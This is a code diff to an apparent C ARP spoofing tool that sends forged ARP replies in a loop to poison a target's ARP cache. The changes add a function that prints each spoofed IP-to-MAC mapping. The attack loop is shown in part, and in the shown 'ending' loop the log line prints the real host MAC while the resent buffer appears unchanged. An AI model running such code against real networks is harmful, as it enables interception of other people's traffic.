@@ -18,6 +18,7 @@ struct arp_data
 void *thread_recivarp(void *p);
 void *thread_relay(void *p);
 void INThandler(int sig);
+void print_packet(struct in_addr * host_ip, uint8_t *host_mac, struct in_addr *target_ip, uint8_t *target_mac);
 
 int arp_spoof(int argc, char **argv)
 {
@@ -81,10 +82,10 @@ int arp_spoof(int argc, char **argv)
 
     buffer = make_arp_reply_packet(info.my_mac, host_ip ,arp_data->target_mac ,target_ip);
 
-    printf("ARP Spoofing...\n");
     signal(SIGINT, INThandler);
     while(1)
     {
+        print_packet(&host_ip,info.my_mac,&target_ip,arp_data->target_mac);
         if((len = sendto(sock, buffer, ARPMAX,0,(struct sockaddr*)&sll,sizeof(sll)))<0)
             perror("sendto");
         if(g_signal_fleg)
@@ -97,6 +98,7 @@ int arp_spoof(int argc, char **argv)
     printf("Spoofing Ending...\n");
     for(int i=0; i<3 ; i++)
     {
+        print_packet(&host_ip,arp_data->host_mac,&target_ip,arp_data->target_mac);
         if((len = sendto(sock, buffer, ARPMAX,0,(struct sockaddr*)&sll,sizeof(sll)))<0)
             perror("sendto");
         sleep(1);
@@ -176,4 +178,15 @@ void INThandler(int sig)
     signal(sig, SIG_IGN);
 
     g_signal_fleg = 1;
+}
+
+void print_packet(struct in_addr * host_ip, uint8_t *host_mac, struct in_addr *target_ip, uint8_t *target_mac)
+{
+    char h_ip[16], t_ip[16];
+    strcpy(h_ip, inet_ntoa(*host_ip));
+    strcpy(t_ip, inet_ntoa(*target_ip));
+
+    printf("%s is at %02x:%02x:%02x:%02x:%02x:%02x -> %s[%02x:%02x:%02x:%02x:%02x:%02x]\n",
+    h_ip, host_mac[0],host_mac[1],host_mac[2],host_mac[3],host_mac[4],host_mac[5],
+    t_ip, target_mac[0],target_mac[1],target_mac[2],target_mac[3],target_mac[4],target_mac[5]);
 }
